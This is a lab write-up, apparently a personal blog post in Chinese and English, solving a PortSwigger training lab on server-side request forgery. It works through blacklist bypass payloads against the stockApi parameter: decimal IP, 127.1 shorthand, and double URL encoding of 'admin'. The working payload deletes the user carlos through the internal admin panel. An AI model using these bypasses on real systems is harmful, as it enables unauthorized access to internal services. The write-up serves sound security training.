---
layout: post
title: "SSRF with blacklist-based input filter"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SSRF
author: ""
tags: ['PortSwigger_Lab', 'SSRF']
---





# SSRF with blacklist-based input filter


```
This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

The developer has deployed two weak anti-SSRF defenses that you will need to bypass.



該實驗室具有庫存檢查功能，可從內部系統獲取數據。

為了解決實驗室問題，更改庫存檢查 URL 以訪問 `http://localhost/admin` 的管理界面並刪除用戶 `carlos`。

開發人員部署了兩個需要繞過的弱反 SSRF 防禦。


```



### IPv4 to IP Decimal Conversion
轉換IP 
```

127.0.0.1 -> 2130706433

```


BP 抓包

```http

POST /product/stock HTTP/1.1
Host: 0ab6002204ef60cec0e939ca006f005d.web-security-academy.net
Cookie: session=DQRdO1snv2jac4xZCnM2HfKbFQTc78Hr
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0ab6002204ef60cec0e939ca006f005d.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Origin: https://0ab6002204ef60cec0e939ca006f005d.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

```

```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1

```


修改
```
stockApi=http://localhost/admin
```


這裡我們用localhost
卻回傳安全原因封鎖 

```http

HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 51

"External stock check blocked for security reasons"
```



digital ip 修改 失敗
```
stockApi=http://2130706433/admin
```

url編碼 失敗
```
stockApi=http://2130706433/%61dmin
```


double url 有出現 Client Error: Forbidden 失敗
```
stockApi=http://2130706433/%25%36%31dmin



resposne:
Client Error: Forbidden
```


double url 失敗
```
stockApi=http://2130706433/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65



resposne:
"Invalid external stock check url 'Illegal character in scheme name at index 8: stockApi=http://2130706433/%61%64%6d%69%6e'"

```


IP 另類解析
https://www.quora.com/Is-127-1-a-valid-IP-address

```
127.1 = 127.0.0.1

127.0.1 = 127.0.0.1

127.1.0 = 127.1.0.0

```




失敗
```
stockApi=http://127.1/admin
```


url編碼 失敗
```
stockApi=http://127.1/%61dmin
```


全部double url 失敗
```

stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65




"Invalid external stock check url 'Illegal character in scheme name at index 8: stockApi=http://127.1/%61%64%6d%69%6e
'"

```


只double  a 字元
```
stockApi=http://127.1/%25%36%31dmin
```


成功 出現刪除畫面F12
```
<a href="/admin/delete?username=carlos">Delete</a>
```


修改
```
stockApi=http://127.1/%25%36%31dmin/delete?username=carlos
```


成功